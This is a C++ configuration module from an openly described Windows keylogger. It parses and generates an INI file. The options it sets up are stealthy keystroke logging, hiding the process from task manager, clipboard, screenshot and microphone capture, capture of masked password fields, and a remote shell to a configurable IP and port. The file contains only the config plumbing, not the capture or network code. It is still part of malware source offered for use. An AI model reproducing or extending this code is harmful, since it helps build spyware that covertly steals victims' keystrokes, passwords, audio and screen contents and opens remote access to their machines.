#include "config.hpp"

#include <ranges>
#include <unordered_map>
#include <unordered_set>

#include <ws2tcpip.h>

#include "helpers.hpp"

using namespace std::literals;

constexpr bool SUCCESS             = true;   // 😎
constexpr bool SKIP                = true;   // Tolerate minor config issues - fallback config available
constexpr bool LOGFILE_UNAVAILABLE = false;  // Can't create/open log file - program cannot continue (it's a keylogger after all 😅)

/* ═════════════════════════════════════════════════════════════════════
   Parse Functions
═════════════════════════════════════════════════════════════════════ */

namespace Parse
{

static std::string_view Trim(std::string_view s)
{
    auto start = s.find_first_not_of(" \t\r\n");
    auto end   = s.find_last_not_of(" \t\r\n");
    return start == std::string_view::npos ? "" : s.substr(start, end - start + 1);
}

static void Bool(std::string_view input, bool& value, std::string_view valueName)
{
    auto str = ToLower(std::string(input));

    if (str == "true" || str == "1" || str == "yes" || str == "on") {
        value = true;
        return;
    }
    if (str == "false" || str == "0" || str == "no" || str == "off") {
        value = false;
        return;
    }

    LogErr("{} | Invalid boolean value: '{}' | Resetting to default [{}]", valueName, input, value);
}

static void Int(std::string_view input, uint32_t& value, std::string_view valueName, uint32_t min, uint32_t max)
{
    uint32_t temp  = 0;
    auto [ptr, ec] = std::from_chars(input.data(), input.data() + input.size(), temp);

    if (ec == std::errc{} && temp >= min && temp <= max) {
        value = temp;
        return;
    }

    LogErr("{} | Invalid integer value: '{}' | Resetting to default [{}]", valueName, input, value);
}

static void Csv(std::string_view input, std::vector<std::string>& value)
{
    input = Trim(input);
    if (input.empty() || input == "*") return;

    std::string current;
    for (char c : input) {
        if (c == ',') {
            if (!current.empty()) value.emplace_back(ToLower(std::string(Trim(current))));
            current.clear();
        } else {
            current += c;
        }
    }
    if (!current.empty()) value.emplace_back(ToLower(std::string(Trim(current))));
}

static void Ip(std::string_view ip, std::string& value, std::string_view valueName)
{
    in_addr addr{};
    if (inet_pton(AF_INET, std::string(ip).c_str(), &addr) == 1) {
        value = ip;
        return;
    }

    LogErr("{} | Invalid IP address: '{}' | Resetting to default [{}]", valueName, ip, value);
}

static void Port(std::string_view port, uint16_t& value, std::string_view valueName)
{
    constexpr uint16_t minPort = 1024;
    constexpr uint16_t maxPort = 49151;

    uint16_t temp  = 0;
    auto [ptr, ec] = std::from_chars(port.data(), port.data() + port.size(), temp);

    if (ec == std::errc{} && temp >= minPort && temp <= maxPort) {
        value = temp;
        return;
    }

    LogErr("{} | Invalid port value: '{}' | Resetting to default [{}]", valueName, port, value);
}

}

/* ═════════════════════════════════════════════════════════════════════
   Config Handlers
═════════════════════════════════════════════════════════════════════ */

Config::Config()
{
    static constexpr auto NO_OP = [](std::string_view) {};
    Handlers = {// [Settings]
                {"keylog_path"sv, NO_OP},
                {"debug_log_path"sv, NO_OP},

                // [Bonuses]
                {"debug_mode"sv, NO_OP},
                {"hide_process"sv,           [&](auto v) { Parse::Bool(v, HideProcess,       "[Bonuses] hide_process"sv); }},
                {"print_config"sv,           [&](auto v) { Parse::Bool(v, PrintConf,         "[Bonuses] print_config"sv); }},
                {"clipboard_logging"sv,      [&](auto v) { Parse::Bool(v, ClipboardLogging,  "[Bonuses] clipboard_logging"sv); }},
                {"screen_capture"sv,         [&](auto v) { Parse::Bool(v, ScreenCapture,     "[Bonuses] screen_capture"sv); }},
                {"microphone_capture"sv,     [&](auto v) { Parse::Bool(v, MicrophoneCapture, "[Bonuses] microphone_capture"sv); }},
                {"masked_capture"sv,         [&](auto v) { Parse::Bool(v, MaskedCapture,     "[Bonuses] masked_capture"sv); }},
                {"remote_shell"sv,           [&](auto v) { Parse::Bool(v, RemoteShell,       "[Bonuses] remote_shell"sv); }},

                // [Screen]
                {"screenshot_interval_sec"sv,    [&](auto v) { Parse::Int(v, ScreenshotIntervalSec, "[Screen] screenshot_interval_sec"sv, 1u, 60u); }},

                // [Microphone]
                {"mic_recording_duration_sec"sv, [&](auto v) { Parse::Int(v, MicrophoneDurationSec, "[Microphone] mic_recording_duration_sec"sv, 5u, 60u); }},

                // [Filters]
                {"monitored_apps"sv,  [&](auto v) { Parse::Csv(v, MonitoredApps); }},
                {"monitored_users"sv, [&](auto v) { Parse::Csv(v, MonitoredUsers); }},

                // [RemoteShell]
                {"ip"sv,   [&](auto v) { Parse::Ip  (v, RemoteIp,   "[RemoteShell] ip"sv); }},
                {"port"sv, [&](auto v) { Parse::Port(v, RemotePort, "[RemoteShell] port"sv); }}};
}

/* ═════════════════════════════════════════════════════════════════════
   Log Initialization
═════════════════════════════════════════════════════════════════════ */

enum class LogTarget : std::uint8_t { Keylog, DebugLog };
using enum LogTarget;

template <LogTarget Log>
static bool InitLog(std::filesystem::path path = "")
{
    auto& stream       = Log == Keylog ? gConfig.KeylogFile : gConfig.DebugLogFile;
    auto& logPath      = Log == Keylog ? gConfig.KeylogPath : gConfig.DebugLogPath;
    auto  fallbackPath = JoinPath(GetExeDir(), logPath);

    if constexpr (Log == DebugLog) {
        if (!gConfig.DebugMode) {
            gConfig.DebugLogPath = "";
            return SKIP;
        }
    }

    if (stream.is_open()) stream.close();

    if (!path.empty()) {
        std::error_code ec;
        std::filesystem::create_directories(path.parent_path(), ec);
        if (ec) {
            LogErr("Unable to create directory for log file '{}': {}", path, ec.message());
        } else {
            stream.open(path, std::ios::app | std::ios::binary);
            if (logPath = path; stream.is_open()) return SUCCESS;
            LogErr("Unable to open log file '{}', trying fallback '{}'", path, fallbackPath);
        }
    }

    stream.open(fallbackPath, std::ios::app | std::ios::binary);
    if (logPath = fallbackPath; stream.is_open()) return SUCCESS;

    LogErr("Unable to open fallback log file '{}'", fallbackPath);
    return LOGFILE_UNAVAILABLE;
}

/* ═════════════════════════════════════════════════════════════════════
   Config Utilities
═════════════════════════════════════════════════════════════════════ */

enum class ParseMode : std::uint8_t { DetectDebugFlag, InitLogs, FullConfig };
using enum ParseMode;

template <ParseMode Mode>
static bool ParseLine(std::string_view line)
{
    static std::unordered_set<std::string> reportedBadLines;

    if (auto comment = line.find(';'); comment != std::string_view::npos) line = line.substr(0, comment);
    auto view = Parse::Trim(line);
    if (view.empty()) return SKIP;

    auto equal = view.find('=');
    if (equal == std::string_view::npos) {
        if (auto [_, inserted] = reportedBadLines.emplace(view); inserted) {
            LogErr("Config: Invalid line '{}', no '=' sign found, ignoring.", view);
        }
        return SKIP;
    }

    auto key = Parse::Trim(view.substr(0, equal));
    auto val = Parse::Trim(view.substr(equal + 1));

    if constexpr (Mode == DetectDebugFlag) {
        if (key == "debug_mode"sv) Parse::Bool(val, gConfig.DebugMode, "debug_mode");
    }

    if constexpr (Mode == InitLogs) {
        if (key == "keylog_path"sv && !InitLog<Keylog>(val)) return LOGFILE_UNAVAILABLE;
        if (key == "debug_log_path"sv && !InitLog<DebugLog>(val)) return LOGFILE_UNAVAILABLE;
    }

    if constexpr (Mode == FullConfig) {
        if (auto it = gConfig.Handlers.find(key); it != gConfig.Handlers.end()) {
            it->second(val);
        } else {
            LogErr("Config: Unknown setting '{}', ignoring.", key);
            return SKIP;
        }
    }

    return SUCCESS;
};

static void GenerateConfigFile()
{
    auto join = [](const std::vector<std::string>& vec) -> std::string {
        if (vec.empty()) return "*";

        auto joined = vec | std::views::join_with(std::string_view{", "});
        return {joined.begin(), joined.end()};
    };

    std::ofstream file(CONFIG_FILE, std::ios::trunc | std::ios::binary);
    if (!file.is_open()) {
        LogErr("Failed to create 'config.ini' file. Please create it manually.");
        return;
    }

    auto configContent = std::format(
R"(; === [Settings] ===
; Keylog file: logs all captured keystrokes. If keylog_path is inaccessible or invalid, it defaults to the executable directory.
keylog_path = {}

; Debug mode: enables internal diagnostic logging. If debug_log_path is inaccessible or invalid, it defaults to the executable directory.
debug_mode = {}
debug_log_path = {}

; === [Bonuses] ===
; Optional features to activate or deactivate.
; Set to true or false.
hide_process = {}             ; Hide service and keylogger from task manager/tools
print_config = {}             ; Print config at each application start
clipboard_logging = {}        ; Enable clipboard text capture
screen_capture = {}           ; Enable periodic screenshots
microphone_capture = {}       ; Enable microphone recording
masked_capture = {}           ; Capture hidden/obfuscated password fields
remote_shell = {}             ; Enable remote shell access

; === [Screen] ===
; Configuration for screen capture bonus.
screenshot_interval_sec = {}      ; Interval between screenshots in seconds (allowed range: 1-60)

; === [Microphone] ===
; Configuration for microphone capture bonus.
mic_recording_duration_sec = {}   ; Duration of each audio recording in seconds (allowed range: 5-60)

; === [Filters] ===
; App and user filtering. Use '*' or keep empty to allow all.
monitored_apps = {}               ; Comma-separated list of allowed process names
monitored_users = {}              ; Comma-separated list of allowed Windows usernames

; === [RemoteShell] ===
; Target for remote shell connection. Feature is disabled if IP is blank or port is zero.
ip = {}                 ; IP address of the remote server
port = {}                      ; Port for remote shell connection (allowed range: 1024-49151)
)",
        JoinPath(GetExeDir(), gConfig.KeylogPath), gConfig.DebugMode, JoinPath(GetExeDir(), gConfig.DebugLogPath), gConfig.HideProcess, gConfig.PrintConf,
        gConfig.ClipboardLogging, gConfig.ScreenCapture, gConfig.MicrophoneCapture, gConfig.MaskedCapture, gConfig.RemoteShell, gConfig.ScreenshotIntervalSec,
        gConfig.MicrophoneDurationSec, join(gConfig.MonitoredApps), join(gConfig.MonitoredUsers), gConfig.RemoteIp, gConfig.RemotePort);

    file << configContent;
    file.close();
    LogInfo("Default configuration file 'config.ini' created. Please review and adjust settings as needed.");
}

void Config::PrintConfig()
{
    auto join = [](const std::vector<std::string>& vec) -> std::string {
        if (vec.empty()) return "*";

        auto joined = vec | std::views::join_with(std::string_view{", "});
        return {joined.begin(), joined.end()};
    };

    LogInfo(
R"(═════════════════ CONFIG SUMMARY ═════════════════
‣ Files
    Keylog    : {}
    Debug     : {}
    DebugLog  : {}
‣ Core bonuses
    Hide process          : {}
    Print config          : {}
‣ Capture bonuses
    Clipboard logging     : {}
    Screen capture        : {}  (interval = {}s)
    Mic recording         : {}  (duration = {}s)
    Masked-input capture  : {}
‣ Remote shell
    Enabled               : {}
    Target                : {} : {}
‣ Filters
    Apps   : {}
    Users  : {}
══════════════════════════════════════════════════
)",
        gConfig.KeylogPath, gConfig.DebugMode, gConfig.DebugLogPath, gConfig.HideProcess, gConfig.PrintConf, gConfig.ClipboardLogging, gConfig.ScreenCapture,
        gConfig.ScreenshotIntervalSec, gConfig.MicrophoneCapture, gConfig.MicrophoneDurationSec, gConfig.MaskedCapture, gConfig.RemoteShell, gConfig.RemoteIp,
        gConfig.RemotePort, join(gConfig.MonitoredApps), join(gConfig.MonitoredUsers));
}

/* ═════════════════════════════════════════════════════════════════════
   Config Initialization
═════════════════════════════════════════════════════════════════════ */

bool Config::Init(const std::filesystem::path& configPath)
{
    std::ifstream file(configPath);
    if (!file.is_open()) {
        LogInfo("Config file '{}' not found. Generating default config file.", configPath);
        GenerateConfigFile();
        if (!InitLog<Keylog>()) return LOGFILE_UNAVAILABLE;
        return SKIP;
    }

    auto runPass = [&]<ParseMode Mode> {
        file.clear();
        file.seekg(0);
        for (std::string line; std::getline(file, line);)
            if (!ParseLine<Mode>(line)) return LOGFILE_UNAVAILABLE;
        return SUCCESS;
    };

    if (!runPass.operator()<DetectDebugFlag>() || !runPass.operator()<InitLogs>()) return LOGFILE_UNAVAILABLE;

    if (!gConfig.KeylogFile && !InitLog<Keylog>()) return LOGFILE_UNAVAILABLE;
    if (gConfig.DebugMode && !gConfig.DebugLogFile && !InitLog<DebugLog>()) return LOGFILE_UNAVAILABLE;

    if (!runPass.operator()<FullConfig>()) return LOGFILE_UNAVAILABLE;

    if (gConfig.PrintConf) gConfig.PrintConfig();

    return SUCCESS;
}
